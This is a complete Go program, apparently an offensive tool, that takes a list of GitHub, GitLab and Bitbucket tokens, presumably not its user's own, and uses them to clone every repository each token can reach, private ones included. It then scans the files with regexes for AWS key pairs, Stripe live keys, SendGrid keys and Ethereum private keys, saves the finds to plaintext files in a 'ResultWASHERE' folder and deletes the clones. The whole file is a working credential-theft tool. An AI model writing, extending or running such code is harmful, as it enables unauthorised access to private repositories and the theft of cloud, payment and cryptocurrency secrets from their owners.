package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Colors
const (
	Reset       = "\033[0m"
	Bold        = "\033[1m"
	Green       = "\033[32m"
	Yellow      = "\033[33m"
	Blue        = "\033[34m"
	Red         = "\033[31m"
	Cyan        = "\033[36m"
	BrightGreen = "\033[92m"
	BrightRed   = "\033[91m"
	BrightCyan  = "\033[96m"
	BrightWhite = "\033[97m"
	Fire        = "\033[38;5;196m"
	Gold        = "\033[38;5;220m"
	Electric    = "\033[38;5;51m"
)

// Statistics
type Stats struct {
	totalTokens     int64
	processedTokens int64
	validTokens     int64
	clonedRepos     int64
	awsKeys         int64
	startTime       time.Time
}

type Repository struct {
	Name     string `json:"name"`
	FullName string `json:"full_name"`
	CloneURL string `json:"clone_url"`
	Private  bool   `json:"private"`
	Fork     bool   `json:"fork"`
}

type AWSHunter struct {
	awsAccessPattern *regexp.Regexp
	awsSecretPattern *regexp.Regexp
	stripeLivePattern *regexp.Regexp
	sgPattern *regexp.Regexp
	ethPrivPattern *regexp.Regexp
	stats           *Stats
	httpClient      *http.Client
	resultFile      *os.File
	fileLock        sync.Mutex
	credentialCache sync.Map // Prevent duplicate credentials
}

func NewAWSHunter() *AWSHunter {
	os.MkdirAll("ResultWASHERE", 0755)
	os.MkdirAll("dummy", 0755)
	
	resultFile, _ := os.OpenFile("ResultWASHERE/aws_keys.txt", 
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

	return &AWSHunter{
		awsAccessPattern: regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
		awsSecretPattern: regexp.MustCompile(`[0-9a-zA-Z\/+]{40}`),
		stripeLivePattern: regexp.MustCompile(`sk_live_[0-9A-Za-z]{24,99}`),
		sgPattern: regexp.MustCompile(`SG\.[0-9A-Za-z-_]{22}\.[0-9A-Za-z-_]{43}`),
	ethPrivPattern: regexp.MustCompile(`0x[0-9a-fA-F]{64}`),
		stats:           &Stats{startTime: time.Now()},
		httpClient:     &http.Client{Timeout: 15 * time.Second},
		resultFile:     resultFile,
	}
}

func printBanner() {
	fmt.Printf(`%s%s
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   %s🚀 AWS CREDENTIAL HUNTER - WORKING VERSION 🚀%s              ║
║   %s⚡ GitHub • GitLab • Bitbucket Support ⚡%s                   ║
║   %s💎 Ultra-Fast 500 Thread Parsing 💎%s                        ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
%s`, Bold, Fire, Fire, Reset, Electric, Reset, Gold, Reset, Reset)
}

func (h *AWSHunter) showStats(tokenIndex, totalTokens int) {
	processedTokens := atomic.LoadInt64(&h.stats.processedTokens)
	validTokens := atomic.LoadInt64(&h.stats.validTokens)
	clonedRepos := atomic.LoadInt64(&h.stats.clonedRepos)
	awsKeys := atomic.LoadInt64(&h.stats.awsKeys)
	
	percentage := float64(processedTokens) / float64(totalTokens) * 100
	
	if awsKeys > 0 {
		fmt.Printf("\n%s╭─ 💎 AWS CREDENTIALS FOUND ────────────────────────────────╮%s\n", 
			Bold+Fire, Reset)
		fmt.Printf("%s│ 🔑 AWS Keys Found: %d                                      │%s\n",
			Bold+Fire, awsKeys, Reset)
		fmt.Printf("%s╰─────────────────────────────────────────────────────────────╯%s\n", 
			Bold+Fire, Reset)
	}
	
	fmt.Printf("\n%s[%.2f%%] Processing: %d/%d | Valid: %d | Repos: %d | AWS Keys: %d%s\n",
		BrightWhite, percentage, processedTokens, totalTokens, validTokens, clonedRepos, awsKeys, Reset)
}

func (h *AWSHunter) detectPlatform(token string) string {
	token = strings.TrimSpace(token)
	if strings.HasPrefix(token, "ghp_") || strings.HasPrefix(token, "github_pat_") {
		return "GitHub"
	}
	if strings.HasPrefix(token, "glpat-") {
		return "GitLab"
	}
	if strings.HasPrefix(token, "ATBB") {
		return "Bitbucket"
	}
	return ""
}

func (h *AWSHunter) processToken(token string, tokenIndex, totalTokens int) {
	fmt.Printf("\n%s=== TOKEN %d/%d ===%s\n", Bold+Electric, tokenIndex+1, totalTokens, Reset)
	
	platform := h.detectPlatform(token)
	if platform == "" {
		fmt.Printf("%s[SKIP] Unknown token format%s\n", Yellow, Reset)
		atomic.AddInt64(&h.stats.processedTokens, 1)
		return
	}
	
	fmt.Printf("%s[CHECKING] %s token...%s\n", Cyan, platform, Reset)
	
	// Get repositories
	repos := h.getRepositories(token, platform)
	if len(repos) == 0 {
		fmt.Printf("%s[INVALID] No accessible repositories%s\n", Red, Reset)
		atomic.AddInt64(&h.stats.processedTokens, 1)
		return
	}
	
	fmt.Printf("%s[✓ VALID] Found %d repositories%s\n", Green, len(repos), Reset)
	atomic.AddInt64(&h.stats.validTokens, 1)
	
	// Process repositories
	h.processRepositories(repos, token)
	
	// CLEANUP AFTER EACH TOKEN (IMPORTANT!)
	fmt.Printf("%s[CLEANUP] Deleting cloned files...%s\n", BrightCyan, Reset)
	h.cleanup()
	
	atomic.AddInt64(&h.stats.processedTokens, 1)
	fmt.Printf("%s[✓ COMPLETED] Token %d processed%s\n", Green, tokenIndex+1, Reset)
}

func (h *AWSHunter) getRepositories(token, platform string) []Repository {
	switch platform {
	case "GitHub":
		return h.getGitHubRepos(token)
	case "GitLab":
		return h.getGitLabRepos(token)
	case "Bitbucket":
		return h.getBitbucketRepos(token)
	}
	return nil
}

func (h *AWSHunter) getGitHubRepos(token string) []Repository {
	var allRepos []Repository
	
	// Get user repositories
	for page := 1; page <= 5; page++ {
		url := fmt.Sprintf("https://api.github.com/user/repos?type=all&per_page=100&page=%d&sort=updated", page)
		
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "token "+token) // Use "token" prefix for GitHub
		req.Header.Set("User-Agent", "AWSHunter/1.0")
		req.Header.Set("Accept", "application/vnd.github.v3+json")
		
		resp, err := h.httpClient.Do(req)
		if err != nil || resp.StatusCode != 200 {
			if resp != nil {
				resp.Body.Close()
			}
			break
		}
		
		var repos []Repository
		if err := json.NewDecoder(resp.Body).Decode(&repos); err != nil {
			resp.Body.Close()
			break
		}
		resp.Body.Close()
		
		if len(repos) == 0 {
			break
		}
		
		allRepos = append(allRepos, repos...)
		time.Sleep(200 * time.Millisecond) // Rate limiting
	}
	
	return allRepos
}

func (h *AWSHunter) getGitLabRepos(token string) []Repository {
	var allRepos []Repository
	
	// Get user projects
	for page := 1; page <= 5; page++ {
		url := fmt.Sprintf("https://gitlab.com/api/v4/projects?membership=true&per_page=100&page=%d&order_by=last_activity_at", page)
		
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		
		resp, err := h.httpClient.Do(req)
		if err != nil || resp.StatusCode != 200 {
			if resp != nil {
				resp.Body.Close()
			}
			break
		}
		
		var projects []struct {
			Name              string `json:"name"`
			PathWithNamespace string `json:"path_with_namespace"`
			HTTPURLToRepo     string `json:"http_url_to_repo"`
			Visibility        string `json:"visibility"`
		}
		
		if err := json.NewDecoder(resp.Body).Decode(&projects); err != nil {
			resp.Body.Close()
			break
		}
		resp.Body.Close()
		
		if len(projects) == 0 {
			break
		}
		
		for _, project := range projects {
			repo := Repository{
				Name:     project.Name,
				FullName: project.PathWithNamespace,
				CloneURL: project.HTTPURLToRepo,
				Private:  project.Visibility == "private",
			}
			allRepos = append(allRepos, repo)
		}
		
		time.Sleep(200 * time.Millisecond)
	}
	
	return allRepos
}

func (h *AWSHunter) getBitbucketRepos(token string) []Repository {
	var allRepos []Repository
	
	// Get user repositories
	for page := 1; page <= 5; page++ {
		url := fmt.Sprintf("https://api.bitbucket.org/2.0/repositories?role=member&per_page=100&page=%d", page)
		
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Accept", "application/json")
		
		resp, err := h.httpClient.Do(req)
		if err != nil || resp.StatusCode != 200 {
			if resp != nil {
				resp.Body.Close()
			}
			break
		}
		
		var response struct {
			Values []struct {
				Name     string `json:"name"`
				FullName string `json:"full_name"`
				IsPrivate bool  `json:"is_private"`
				Links     struct {
					Clone []struct {
						Name string `json:"name"`
						Href string `json:"href"`
					} `json:"clone"`
				} `json:"links"`
			} `json:"values"`
		}
		
		if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
			resp.Body.Close()
			break
		}
		resp.Body.Close()
		
		if len(response.Values) == 0 {
			break
		}
		
		for _, repo := range response.Values {
			cloneURL := ""
			for _, link := range repo.Links.Clone {
				if link.Name == "https" {
					cloneURL = link.Href
					break
				}
			}
			
			repository := Repository{
				Name:     repo.Name,
				FullName: repo.FullName,
				CloneURL: cloneURL,
				Private:  repo.IsPrivate,
			}
			
			allRepos = append(allRepos, repository)
		}
		
		time.Sleep(200 * time.Millisecond)
	}
	
	return allRepos
}

func (h *AWSHunter) processRepositories(repos []Repository, token string) {
	fmt.Printf("%s[CLONING] Processing %d repositories...%s\n", Yellow, len(repos), Reset)
	
	// Clone repositories
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 3) // 3 concurrent clones
	
	for _, repo := range repos {
		wg.Add(1)
		semaphore <- struct{}{}
		
		go func(repo Repository) {
			defer wg.Done()
			defer func() { <-semaphore }()
			
			h.cloneRepository(repo, token)
			time.Sleep(500 * time.Millisecond)
		}(repo)
	}
	
	wg.Wait()
	
	// Parse all files
	fmt.Printf("%s[PARSING] Scanning with 500 workers...%s\n", Electric, Reset)
	h.parseAllFiles()
	
	// NO CLEANUP HERE - Will be called in processToken()
}

func (h *AWSHunter) cloneRepository(repo Repository, token string) {
	repoDir := filepath.Join("dummy", strings.ReplaceAll(repo.FullName, "/", "_"))
	
	cloneURL := repo.CloneURL
	if strings.Contains(cloneURL, "github.com") {
		cloneURL = strings.Replace(cloneURL, "https://", fmt.Sprintf("https://%s@", token), 1)
	} else if strings.Contains(cloneURL, "gitlab.com") {
		cloneURL = strings.Replace(cloneURL, "https://", fmt.Sprintf("https://oauth2:%s@", token), 1)
	} else if strings.Contains(cloneURL, "bitbucket.org") {
		cloneURL = strings.Replace(cloneURL, "https://", fmt.Sprintf("https://x-token-auth:%s@", token), 1)
	}
	
	cmd := exec.Command("git", "clone", "--depth", "1", cloneURL, repoDir)
	cmd.Stdout = nil
	cmd.Stderr = nil
	
	if err := cmd.Run(); err == nil {
		atomic.AddInt64(&h.stats.clonedRepos, 1)
	}
}

func (h *AWSHunter) parseAllFiles() {
	var allFiles []string
	
	// Walk through all files
	filepath.Walk("dummy", func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		
		if h.shouldParseFile(filepath.Ext(path)) {
			allFiles = append(allFiles, path)
		}
		
		return nil
	})
	
	// Parse with 500 workers
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 500)
	
	for _, filePath := range allFiles {
		wg.Add(1)
		semaphore <- struct{}{}
		
		go func(path string) {
			defer wg.Done()
			defer func() { <-semaphore }()
			
			h.parseFile(path)
		}(filePath)
	}
	
	wg.Wait()
}

func (h *AWSHunter) shouldParseFile(ext string) bool {
	skipExts := []string{
		".exe", ".dll", ".so", ".bin", ".deb", ".rpm",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico",
		".mp4", ".avi", ".mov", ".mkv", ".wmv", ".flv",
		".zip", ".tar", ".gz", ".rar", ".7z", ".bz2",
		".mp3", ".wav", ".flac", ".aac", ".ogg",
		".ttf", ".otf", ".woff", ".woff2", ".eot",
	}
	
	extLower := strings.ToLower(ext)
	for _, skipExt := range skipExts {
		if extLower == skipExt {
			return false
		}
	}
	
	return true
}

func (h *AWSHunter) parseFile(filePath string) {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return
	}
	
	text := string(content)
	
	// Find AWS credentials using FindAll
	awsAccessKeys := h.awsAccessPattern.FindAllString(text, -1)
	awsSecretKeys := h.awsSecretPattern.FindAllString(text, -1)

	// Find Stripe Live Keys
	stripeLiveKeys := h.stripeLivePattern.FindAllString(text, -1)
	stripeLiveKeys = removeDuplicates(stripeLiveKeys)
	for _, key := range stripeLiveKeys {
		pair := "STRIPE|" + key
		if _, exists := h.credentialCache.LoadOrStore(pair, true); !exists {
			h.saveCredential("STRIPE", key)
			fmt.Printf("%s[🔑 STRIPE LIVE FOUND] %s | %s%s\n", BrightCyan, extractRepoName(filePath), key, Reset)
		}
	}

	// Find SendGrid Keys
	sgKeys := h.sgPattern.FindAllString(text, -1)
	sgKeys = removeDuplicates(sgKeys)
	for _, key := range sgKeys {
		pair := "SENDGRID|" + key
		if _, exists := h.credentialCache.LoadOrStore(pair, true); !exists {
			h.saveCredential("SENDGRID", key)
			fmt.Printf("%s[🔑 SENDGRID FOUND] %s | %s%s\n", BrightCyan, extractRepoName(filePath), key, Reset)
		}
	}

	// Find Ethereum Private Keys
	ethPrivKeys := h.ethPrivPattern.FindAllString(text, -1)
	ethPrivKeys = removeDuplicates(ethPrivKeys)
	for _, key := range ethPrivKeys {
		pair := "ETHEREUM|" + key
		if _, exists := h.credentialCache.LoadOrStore(pair, true); !exists {
			h.saveCredential("ETHEREUM", key)
			fmt.Printf("%s[🔑 ETH PRIVATE KEY FOUND] %s | %s%s\n", BrightRed, extractRepoName(filePath), key, Reset)
		}
	}
	
	// Remove duplicates
	accessKeys := removeDuplicates(awsAccessKeys)
	secretKeys := removeDuplicates(awsSecretKeys)
	
	// Create pairs
	if len(accessKeys) > 0 && len(secretKeys) > 0 {
		for _, accessKey := range accessKeys {
			for _, secretKey := range secretKeys {
				if len(secretKey) == 40 && secretKey != accessKey {
					// Check if this credential pair already exists (prevent duplicates)
					pair := fmt.Sprintf("%s|%s", accessKey, secretKey)
					
					// Use sync.Map to prevent duplicate saves
					if _, exists := h.credentialCache.LoadOrStore(pair, true); !exists {
						h.saveCredential(accessKey, secretKey)
						atomic.AddInt64(&h.stats.awsKeys, 1)
						
						repoName := extractRepoName(filePath)
						fileName := filepath.Base(filePath)
						fmt.Printf("%s[🔑 AWS FOUND] %s | %s | %s | %s%s\n", 
							BrightGreen, repoName, fileName, accessKey, secretKey, Reset)
					}
					break
				}
			}
		}
	}
}

func (h *AWSHunter) saveCredential(accessKey, secretKey string) {
	h.fileLock.Lock()
	defer h.fileLock.Unlock()
	var filePath string
	if accessKey == "STRIPE" {
		filePath = "ResultWASHERE/stripe_live_keys.txt"
	} else if accessKey == "SENDGRID" {
		filePath = "ResultWASHERE/sendgrid_keys.txt"
	} else if accessKey == "ETHEREUM" {
		filePath = "ResultWASHERE/eth_private_keys.txt"
	} else {
		filePath = "ResultWASHERE/aws_keys.txt"
	}
	entry := fmt.Sprintf("%s|%s\n", accessKey, secretKey)
	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(entry)
		f.Sync()
		f.Close()
	}
}

func (h *AWSHunter) cleanup() {
	fmt.Printf("%s[CLEANUP] Force deleting dummy folder...%s\n", BrightCyan, Reset)
	
	// Method 1: Try Go's RemoveAll first (most reliable)
	if err := os.RemoveAll("dummy"); err == nil {
		fmt.Printf("%s[CLEANUP] ✓ Go RemoveAll successful%s\n", Green, Reset)
	} else {
		fmt.Printf("%s[CLEANUP] ❌ Go RemoveAll failed: %v%s\n", Red, err, Reset)
	}
	
	// Method 2: Force command line delete
	if runtime.GOOS == "windows" {
		fmt.Printf("%s[CLEANUP] Using Windows force delete...%s\n", Yellow, Reset)
		cmd := exec.Command("cmd", "/C", `rmdir /s /q "dummy" 2>nul`)
		if err := cmd.Run(); err != nil {
			fmt.Printf("%s[CLEANUP] ❌ Windows rmdir failed: %v%s\n", Red, err, Reset)
		} else {
			fmt.Printf("%s[CLEANUP] ✓ Windows rmdir successful%s\n", Green, Reset)
		}
	} else {
		fmt.Printf("%s[CLEANUP] Using Linux force delete...%s\n", Yellow, Reset)
		cmd := exec.Command("sh", "-c", `rm -rf "dummy" 2>/dev/null`)
		if err := cmd.Run(); err != nil {
			fmt.Printf("%s[CLEANUP] ❌ Linux rm failed: %v%s\n", Red, err, Reset)
		} else {
			fmt.Printf("%s[CLEANUP] ✓ Linux rm successful%s\n", Green, Reset)
		}
	}
	
	// Method 3: Individual file deletion if above fails
	if _, err := os.Stat("dummy"); err == nil {
		fmt.Printf("%s[CLEANUP] Dummy folder still exists, trying individual deletion...%s\n", Yellow, Reset)
		h.forceDeleteDirectory("dummy")
	}
	
	// Always recreate the directory
	if err := os.MkdirAll("dummy", 0755); err != nil {
		fmt.Printf("%s[CLEANUP] ❌ Failed to recreate dummy: %v%s\n", Red, err, Reset)
	} else {
		fmt.Printf("%s[CLEANUP] ✓ Dummy folder recreated%s\n", Green, Reset)
	}
	
	// Verify cleanup worked
	entries, err := os.ReadDir("dummy")
	if err != nil {
		fmt.Printf("%s[CLEANUP] ❌ Cannot read dummy folder%s\n", Red, Reset)
	} else if len(entries) > 0 {
		fmt.Printf("%s[CLEANUP] ⚠️  WARNING: %d items still in dummy folder!%s\n", Yellow, len(entries), Reset)
		for _, entry := range entries {
			fmt.Printf("%s[CLEANUP] - %s%s\n", Yellow, entry.Name(), Reset)
		}
	} else {
		fmt.Printf("%s[CLEANUP] ✅ Cleanup verified successful - dummy folder is empty%s\n", BrightGreen, Reset)
	}
}

func (h *AWSHunter) forceDeleteDirectory(dirPath string) {
	entries, err := os.ReadDir(dirPath)
	if err != nil {
		return
	}
	
	for _, entry := range entries {
		fullPath := filepath.Join(dirPath, entry.Name())
		
		if entry.IsDir() {
			// Recursively delete subdirectory
			h.forceDeleteDirectory(fullPath)
			os.Remove(fullPath)
		} else {
			// Delete file (try to make writable first)
			os.Chmod(fullPath, 0777)
			os.Remove(fullPath)
		}
	}
	
	// Remove the directory itself
	os.Remove(dirPath)
}

func (h *AWSHunter) loadTokens(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var tokens []string
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		token := strings.TrimSpace(scanner.Text())
		if token != "" && len(token) > 10 {
			tokens = append(tokens, token)
		}
	}
	
	atomic.StoreInt64(&h.stats.totalTokens, int64(len(tokens)))
	return tokens, scanner.Err()
}

func extractRepoName(filePath string) string {
	parts := strings.Split(filePath, string(os.PathSeparator))
	if len(parts) >= 2 {
		return strings.ReplaceAll(parts[1], "_", "/")
	}
	return "unknown"
}

func removeDuplicates(slice []string) []string {
	keys := make(map[string]bool)
	var result []string
	
	for _, item := range slice {
		if !keys[item] {
			keys[item] = true
			result = append(result, item)
		}
	}
	
	return result
}

func getInput(prompt string) string {
	fmt.Printf("%s%s%s ", Cyan, prompt, Reset)
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	return strings.TrimSpace(scanner.Text())
}

func main() {
	printBanner()
	
	tokenFile := getInput("📁 Token file path:")
	
	fmt.Printf("\n%s🚀 Starting AWS Hunter...%s\n", Green, Reset)
	
	hunter := NewAWSHunter()
	defer hunter.resultFile.Close()
	
	tokens, err := hunter.loadTokens(tokenFile)
	if err != nil {
		fmt.Printf("%s❌ Error loading tokens: %v%s\n", Red, err, Reset)
		return
	}
	
	fmt.Printf("%s✅ Loaded %d tokens%s\n", Green, len(tokens), Reset)
	
	// Process tokens one by one
	for i, token := range tokens {
		hunter.showStats(i, len(tokens))
		hunter.processToken(token, i, len(tokens))
		time.Sleep(300 * time.Millisecond)
	}
	
	hunter.showStats(len(tokens), len(tokens))
	fmt.Printf("\n%s🎉 Completed! Check ResultWASHERE/aws_keys.txt%s\n", Green, Reset)
}
